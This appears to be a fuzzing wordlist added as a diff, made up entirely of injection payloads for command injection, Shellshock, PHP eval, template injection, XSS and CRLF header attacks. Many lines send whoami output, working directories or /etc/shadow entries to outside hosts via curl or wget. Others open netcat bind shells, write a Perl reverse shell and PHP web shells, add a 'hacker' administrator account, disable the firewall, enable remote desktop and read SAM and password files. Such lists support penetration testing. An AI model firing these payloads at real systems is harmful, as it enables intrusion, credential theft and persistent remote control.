+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
+cat /etc/hosts
+$(`cat /etc/passwd`)
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+`
+|| 
+| 
+; 
+'
+'"
+"
+"'
+& 
+&& 
+%0a
+%0a%0d
+
+%0Aid
+%0a id %0a
+%0Aid%0A
+!whoami!
+%whoami%
+!%whoami
+%!whoami
+%!whoami!%
+!%whoami%!
+%0a ping -i 30 127.0.0.1 %0a
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+%20{${phpinfo()}}
+%20{${sleep(20)}}
+%20{${sleep(3)}}
+a|id|
+a;id|
+a;id;
+a;id\n
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
+| curl http://crowdshield.com/.testing/rce.txt
+& curl http://crowdshield.com/.testing/rce.txt
+; curl https://crowdshield.com/.testing/rce_vuln.txt
+&& curl https://crowdshield.com/.testing/rce_vuln.txt
+curl https://crowdshield.com/.testing/rce_vuln.txt
+ curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+dir
+| dir
+; dir
+$(`dir`)
+& dir
+&&dir
+&& dir
+| dir C:\
+; dir C:\
+& dir C:\
+&& dir C:\
+dir C:\
+| dir C:\Documents and Settings\*
+; dir C:\Documents and Settings\*
+& dir C:\Documents and Settings\*
+&& dir C:\Documents and Settings\*
+dir C:\Documents and Settings\*
+| dir C:\Users
+; dir C:\Users
+& dir C:\Users
+&& dir C:\Users
+dir C:\Users
+;echo%20'<script>alert(1)</script>'
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+| echo "<?php include($_GET['page'])| ?>" > rfi.php
+; echo "<?php include($_GET['page']); ?>" > rfi.php
+& echo "<?php include($_GET['page']); ?>" > rfi.php
+&& echo "<?php include($_GET['page']); ?>" > rfi.php
+echo "<?php include($_GET['page']); ?>" > rfi.php
+| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
+; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
+; echo "<?php system($_GET['cmd']); ?>" > cmd.php
+& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+echo "<?php system($_GET['cmd']); ?>" > cmd.php
+;echo '<script>alert(1)</script>'
+echo '<script>alert(1)</script>'// XXXXXXXXXXX
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
+| echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+&& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+() { :;}; echo vulnerable 10
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+eval('ls')
+eval('pwd')
+eval('pwd');
+eval('sleep 5')
+eval('sleep 5');
+eval('whoami')
+eval('whoami');
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+exec('ls')
+exec('pwd')
+exec('pwd');
+exec('sleep 5')
+exec('sleep 5');
+exec('whoami')
+exec('whoami');
+;{$_GET["cmd"]}
+`id`
+|id
+| id
+;id
+;id|
+;id;
+& id
+&&id
+;id\n
+ifconfig
+| ifconfig
+; ifconfig
+& ifconfig
+&& ifconfig
+/index.html|id|
+ipconfig
+| ipconfig /all
+; ipconfig /all
+& ipconfig /all
+&& ipconfig /all
+ipconfig /all
+ls
+$(`ls`)
+| ls -l /
+; ls -l /
+& ls -l /
+&& ls -l /
+ls -l /
+| ls -laR /etc
+; ls -laR /etc
+& ls -laR /etc
+&& ls -laR /etc
+| ls -laR /var/www
+; ls -laR /var/www
+& ls -laR /var/www
+&& ls -laR /var/www
+| ls -l /etc/
+; ls -l /etc/
+& ls -l /etc/
+&& ls -l /etc/
+ls -l /etc/
+ls -lh /etc/
+| ls -l /home/*
+; ls -l /home/*
+& ls -l /home/*
+&& ls -l /home/*
+ls -l /home/*
+*; ls -lhtR /var/www/
+| ls -l /tmp
+; ls -l /tmp
+& ls -l /tmp
+&& ls -l /tmp
+ls -l /tmp
+| ls -l /var/www/*
+; ls -l /var/www/*
+& ls -l /var/www/*
+&& ls -l /var/www/*
+ls -l /var/www/*
+\n
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+\n/bin/ls -al\n
+| nc -lvvp 4444 -e /bin/sh|
+; nc -lvvp 4444 -e /bin/sh;
+& nc -lvvp 4444 -e /bin/sh&
+&& nc -lvvp 4444 -e /bin/sh &
+nc -lvvp 4444 -e /bin/sh
+nc -lvvp 4445 -e /bin/sh &
+nc -lvvp 4446 -e /bin/sh|
+nc -lvvp 4447 -e /bin/sh;
+nc -lvvp 4448 -e /bin/sh&
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Asleep 5\n
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
+| net localgroup Administrators hacker /ADD
+; net localgroup Administrators hacker /ADD
+& net localgroup Administrators hacker /ADD
+&& net localgroup Administrators hacker /ADD
+net localgroup Administrators hacker /ADD
+| netsh firewall set opmode disable
+; netsh firewall set opmode disable
+& netsh firewall set opmode disable
+&& netsh firewall set opmode disable
+netsh firewall set opmode disable
+netstat
+;netstat -a;
+| netstat -an
+; netstat -an
+& netstat -an
+&& netstat -an
+netstat -an
+| net user hacker Password1 /ADD
+; net user hacker Password1 /ADD
+& net user hacker Password1 /ADD
+&& net user hacker Password1 /ADD
+net user hacker Password1 /ADD
+| net view
+; net view
+& net view
+&& net view
+net view
+\nid|
+\nid;
+\nid\n
+\n/usr/bin/id\n
+perl -e 'print "X"x1024'
+|| perl -e 'print "X"x16096'
+| perl -e 'print "X"x16096'
+; perl -e 'print "X"x16096'
+& perl -e 'print "X"x16096'
+&& perl -e 'print "X"x16096'
+perl -e 'print "X"x16384'
+; perl -e 'print "X"x2048'
+& perl -e 'print "X"x2048'
+&& perl -e 'print "X"x2048'
+perl -e 'print "X"x2048'
+|| perl -e 'print "X"x4096'
+| perl -e 'print "X"x4096'
+; perl -e 'print "X"x4096'
+& perl -e 'print "X"x4096'
+&& perl -e 'print "X"x4096'
+perl -e 'print "X"x4096'
+|| perl -e 'print "X"x8096'
+| perl -e 'print "X"x8096'
+; perl -e 'print "X"x8096'
+&& perl -e 'print "X"x8096'
+perl -e 'print "X"x8192'
+perl -e 'print "X"x81920'
+|| phpinfo()
+| phpinfo()
+ {${phpinfo()}}
+;phpinfo()
+;phpinfo();//
+';phpinfo();//
+{${phpinfo()}}
+& phpinfo()
+&& phpinfo()
+phpinfo()
+phpinfo();
+<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj");?>
+<?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
+<?php system("sleep 10");?>
+<?php system("sleep 5");?>
+<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc");?>
+:phpversion();
+`ping 127.0.0.1`
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+;${@print(md5(RCEVulnerable))};
+${@print("RCEVulnerable")}
+${@print(system($_SERVER['HTTP_USER_AGENT']))}
+pwd
+| pwd
+; pwd
+& pwd
+&& pwd
+\r
+| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+\r\n
+route
+| sleep 1
+; sleep 1
+& sleep 1
+&& sleep 1
+sleep 1
+|| sleep 10
+| sleep 10
+; sleep 10
+{${sleep(10)}}
+& sleep 10 
+&& sleep 10
+sleep 10
+|| sleep 15
+| sleep 15
+; sleep 15
+& sleep 15 
+&& sleep 15
+ {${sleep(20)}}
+{${sleep(20)}}
+ {${sleep(3)}}
+{${sleep(3)}}
+| sleep 5
+; sleep 5
+& sleep 5
+&& sleep 5
+sleep 5
+ {${sleep(hexdec(dechex(20)))}} 
+{${sleep(hexdec(dechex(20)))}} 
+sysinfo
+| sysinfo
+; sysinfo
+& sysinfo
+&& sysinfo
+system('cat C:\boot.ini');
+system('cat config.php');
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+system('curl https://crowdshield.com/.testing/rce_vuln.txt')
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+systeminfo
+| systeminfo
+; systeminfo
+& systeminfo
+&& systeminfo
+system('ls')
+system('pwd')
+system('pwd');
+|| system('sleep 5');
+| system('sleep 5');
+; system('sleep 5');
+& system('sleep 5');
+&& system('sleep 5');
+system('sleep 5')
+system('sleep 5');
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
+system('whoami')
+system('whoami');
+test*; ls -lhtR /var/www/
+test* || perl -e 'print "X"x16096'
+test* | perl -e 'print "X"x16096'
+test* & perl -e 'print "X"x16096'
+test* && perl -e 'print "X"x16096'
+test*; perl -e 'print "X"x16096'
+$(`type C:\boot.ini`)
+&&type C:\\boot.ini
+| type C:\Windows\repair\SAM
+; type C:\Windows\repair\SAM
+& type C:\Windows\repair\SAM
+&& type C:\Windows\repair\SAM
+type C:\Windows\repair\SAM
+| type C:\Windows\repair\SYSTEM
+; type C:\Windows\repair\SYSTEM
+& type C:\Windows\repair\SYSTEM
+&& type C:\Windows\repair\SYSTEM
+type C:\Windows\repair\SYSTEM
+| type C:\WINNT\repair\SAM
+; type C:\WINNT\repair\SAM
+& type C:\WINNT\repair\SAM
+&& type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SYSTEM
+| type %SYSTEMROOT%\repair\SAM
+; type %SYSTEMROOT%\repair\SAM
+& type %SYSTEMROOT%\repair\SAM
+&& type %SYSTEMROOT%\repair\SAM
+type %SYSTEMROOT%\repair\SAM
+| type %SYSTEMROOT%\repair\SYSTEM
+; type %SYSTEMROOT%\repair\SYSTEM
+& type %SYSTEMROOT%\repair\SYSTEM
+&& type %SYSTEMROOT%\repair\SYSTEM
+type %SYSTEMROOT%\repair\SYSTEM
+uname
+;uname;
+| uname -a
+; uname -a
+& uname -a
+&& uname -a
+uname -a
+|/usr/bin/id
+;|/usr/bin/id|
+;/usr/bin/id|
+$;/usr/bin/id
+() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
+| wget http://crowdshield.com/.testing/rce.txt
+& wget http://crowdshield.com/.testing/rce.txt
+; wget https://crowdshield.com/.testing/rce_vuln.txt
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
+&& wget https://crowdshield.com/.testing/rce_vuln.txt
+wget https://crowdshield.com/.testing/rce_vuln.txt
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+which curl
+which gcc
+which nc
+which netcat
+which perl
+which python
+which wget
+whoami
+| whoami
+; whoami
+' whoami
+' || whoami
+' & whoami
+' && whoami
+'; whoami
+" whoami
+" || whoami
+" | whoami
+" & whoami
+" && whoami
+"; whoami
+$(`whoami`)
+& whoami
+&& whoami
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{4+4}}
+{{4+8}}
+{{person.secret}}
+{{person.name}}
+{1} + {1}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+somedir \x1a whoami
+\! whoami
+word " c:\\where\\ || dir || '
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{4+4}}
+{{4+8}}
+{{person.secret}}
+{{person.name}}
+{1} + {1}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+
+/%%0a0aSet-Cookie:crlf=injection
+/%0aSet-Cookie:crlf=injection
+/%0d%0aSet-Cookie:crlf=injection
+/%0dSet-Cookie:crlf=injection
+/%23%0aSet-Cookie:crlf=injection
+/%23%0d%0aSet-Cookie:crlf=injection
+/%23%0dSet-Cookie:crlf=injection
+/%25%30%61Set-Cookie:crlf=injection
+/%25%30aSet-Cookie:crlf=injection
+/%250aSet-Cookie:crlf=injection
+/%25250aSet-Cookie:crlf=injection
+/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
+/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
+/%2F..%0d%0aSet-Cookie:crlf=injection
+/%3f%0d%0aSet-Cookie:crlf=injection
+/%3f%0dSet-Cookie:crlf=injection
+/%u000aSet-Cookie:crlf=injection
+%%0A0AHeader-Test:BLATRUC
+%0A%20Header-Test:BLATRUC
+/%0A%20Set-Cookie:whoami=rahul
+/%0A%20Set-Cookie:whoami=test
+%0AHeader-Test:BLATRUC
+/%0Aset-cookie:%20hello=how;%0Aevil=evil;
+%0D%0A%09Header-Test:BLATRUC
+/%0D%0A%0D%0ASet-Cookie:crlfinjection=rahul
+%0D%0A%20Header-Test:BLATRUC
+/%0D%0A%20Set-Cookie:whoami=rahul
+/%0D%0A%20Set-Cookie:whoami=test
+%0D%0AHeader-Test:BLATRUC
